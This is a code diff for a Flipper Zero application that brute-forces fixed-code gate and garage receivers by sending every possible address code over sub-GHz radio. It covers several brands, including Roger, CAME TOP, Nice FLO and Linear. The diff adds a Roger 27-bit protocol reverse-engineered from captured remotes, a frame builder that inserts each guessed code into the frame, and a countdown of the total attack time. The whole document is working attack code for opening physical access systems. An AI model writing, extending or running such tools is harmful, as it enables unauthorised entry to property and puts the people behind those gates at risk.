@@ -1,7 +1,7 @@
 // RF Gate Multi-Brand Brute-force for Flipper Zero
 // Per-code TX: sends sync + each code individually — works with all gate
 // receivers including sync-gated decoders (HT12D etc.).
-// Roger, CAME TOP, Nice FLO, Linear 300 MHz, Custom 480µs (measured).
+// Roger Gate, CAME TOP, Nice FLO, Linear 300 MHz, Roger 27-bit (measured).
 #include <furi.h>
 #include <furi_hal.h>
 #include <furi_hal_subghz.h>
@@ -18,29 +18,57 @@
 typedef struct {
     const char* name;
     uint32_t    freq;
-    uint8_t     order;     // code bit-width; brute-forces 2^order codes
-    uint16_t    sync_on;   // µs
-    uint16_t    sync_off;
+    uint8_t     order;      // address bit-width; sweeps 2^order codes
+    uint16_t    sync_on;    // µs — trailing pulse before sync gap
+    uint16_t    sync_off;   // µs — sync gap (receiver resets on this silence)
     uint16_t    bit1_on;
     uint16_t    bit1_off;
     uint16_t    bit0_on;
     uint16_t    bit0_off;
-    uint8_t     repeats;   // full sweeps through all codes
+    uint8_t     repeats;    // full sweeps through all codes
+    // Fixed-frame extension (all zero → standard: frame_bits == order)
+    uint8_t     frame_bits; // total bits per frame (0 = same as order)
+    uint32_t    var_mask;   // which frame bit positions are variable (MSB=first tx'd bit)
+    uint32_t    fixed_val;  // values of the fixed bit positions
 } Protocol;
 
 // Timing values sourced from published protocol specs and Flipper SubGhz
 // implementation.  CAME/Nice/Linear values are approximate.
-// "Custom 480us" timing measured directly from captured RAW gate signals
-// (te=480µs, long=960µs, inter-frame gap=12000µs, 28-bit fixed-code frame).
+//
+// Roger 27-bit: frame structure reverse-engineered from RAW captures of two
+// Roger fixed-code gate remotes.  Exactly 12 bits vary between remotes
+// (DIP-equivalent address); 15 bits are fixed protocol overhead.
+// Frame template (. = fixed, X = address bit, MSB transmitted first):
+//   . X X X X X . . X X . X . X X X . . . . . . X . . . .
+// var_mask  bits set at uint32 positions 25,24,23,22,21,18,17,15,13,12,11,4
+// fixed_val bits set at uint32 positions 20,19,7  (frame positions 6,7,19 = 1)
+// Sync gap 3000 µs → 4096 codes × ~42 ms ≈ 173 s total.
 static const Protocol PROTOS[] = {
     // name            freq        ord  sOn   sOff   1on  1off   0on  0off rep
     { "Roger Gate",  433920000,  12,  100,  3100,  600,  200,  200,  600,  1 },
     { "CAME TOP",    433920000,  12,  320,  9100,  320,  640,  640,  320,  1 },
     { "Nice FLO",    433920000,  12,  500,  8500,  500, 1000, 1000,  500,  1 },
     { "Linear 300",  300000000,  10, 1200, 10000,  600, 1200, 1200,  600,  1 },
-    { "Custom 480us",433920000,  12,  480, 12000,  960,  480,  480,  960,  1 },
+    // Roger 27-bit: te=480µs, 12 address bits embedded in 27-bit fixed frame
+    { "Roger 27-bit",433920000,  12,  480,  3000,  960,  480,  480,  960,  1,
+      27, 0x03E6B810u, 0x00180080u },
 };
 #define PROTO_COUNT ((uint8_t)(sizeof(PROTOS) / sizeof(PROTOS[0])))
+
+// ── Fixed-frame builder ───────────────────────────────────────────────────────
+// Scatters the `order`-bit code into the variable positions of a frame_bits-wide
+// frame, MSB of code → first variable position (MSB of frame).
+static uint32_t make_frame(const Protocol* p, uint16_t code) {
+    uint32_t frame    = p->fixed_val;
+    int8_t   code_bit = (int8_t)(p->order - 1);
+    for(int8_t pos = (int8_t)(p->frame_bits - 1); pos >= 0 && code_bit >= 0; pos--) {
+        if((p->var_mask >> pos) & 1u) {
+            if((code >> code_bit) & 1u) frame |= (1u << pos);
+            code_bit--;
+        }
+    }
+    return frame;
+}
 
 // ── CC1101 OOK 270 kHz async preset ──────────────────────────────────────────
 static const uint8_t PRESET_OOK270[] = {
@@ -75,6 +103,7 @@ typedef struct {
     volatile size_t progress;
     volatile bool   stop;
     volatile bool   signaled;
+    uint32_t        current_frame; // pre-built frame for fixed-frame protocols
 } TxState;
 
 static LevelDuration tx_callback(void* ctx) {
@@ -97,19 +126,32 @@ static LevelDuration tx_callback(void* ctx) {
 
     case PHASE_SYNC_OFF:
         s->phase = PHASE_BIT_ON;
-        s->bit = 0;
+        s->bit   = 0;
+        if(s->proto->frame_bits) {
+            s->current_frame = make_frame(s->proto, s->code);
+        }
         return level_duration_make(false, s->proto->sync_off);
 
-    case PHASE_BIT_ON:
-        s->bit_val = (s->code >> s->bit) & 1;
-        s->phase = PHASE_BIT_OFF;
-        return level_duration_make(true, s->bit_val ? s->proto->bit1_on : s->proto->bit0_on);
+    case PHASE_BIT_ON: {
+        uint8_t bv;
+        if(s->proto->frame_bits) {
+            // Fixed-frame: read MSB-first from pre-built 27(+)-bit frame
+            bv = (s->current_frame >> (s->proto->frame_bits - 1 - s->bit)) & 1u;
+        } else {
+            // Standard: read LSB-first from code value
+            bv = (s->code >> s->bit) & 1u;
+        }
+        s->bit_val = bv;
+        s->phase   = PHASE_BIT_OFF;
+        return level_duration_make(true, bv ? s->proto->bit1_on : s->proto->bit0_on);
+    }
 
     default: { // PHASE_BIT_OFF
         LevelDuration ld = level_duration_make(
             false, s->bit_val ? s->proto->bit1_off : s->proto->bit0_off);
         s->bit++;
-        if(s->bit < s->proto->order) {
+        uint8_t frame_end = s->proto->frame_bits ? s->proto->frame_bits : s->proto->order;
+        if(s->bit < frame_end) {
             s->phase = PHASE_BIT_ON;
         } else {
             s->code++;
@@ -118,7 +160,7 @@ static LevelDuration tx_callback(void* ctx) {
                 s->pass++;
             }
             s->progress = (size_t)s->pass * s->total_codes + s->code;
-            s->phase = PHASE_SYNC_ON;
+            s->phase    = PHASE_SYNC_ON;
         }
         return ld;
     }
@@ -179,7 +221,14 @@ static void draw_cb(Canvas* canvas, void* ctx) {
         snprintf(buf, sizeof(buf), "%u codes x%u pass",
                  (unsigned)(1u << PROTOS[sel].order), PROTOS[sel].repeats);
         canvas_draw_str(canvas, 2, 44, buf);
-        canvas_draw_str(canvas, 2, 57, "BACK to abort");
+        // Estimated total time
+        uint8_t  fb     = PROTOS[sel].frame_bits ? PROTOS[sel].frame_bits : PROTOS[sel].order;
+        uint32_t us_ea  = (uint32_t)PROTOS[sel].sync_on + PROTOS[sel].sync_off
+                        + (uint32_t)fb * ((uint32_t)PROTOS[sel].bit1_on + PROTOS[sel].bit1_off);
+        uint32_t est_s  = us_ea * (uint32_t)(1u << PROTOS[sel].order)
+                        * PROTOS[sel].repeats / 1000000u;
+        snprintf(buf, sizeof(buf), "~%u:%02u  BACK:abort", est_s / 60, est_s % 60);
+        canvas_draw_str(canvas, 2, 57, buf);
 
     } else {
         canvas_draw_str(canvas, 2, 10, PROTOS[sel].name);
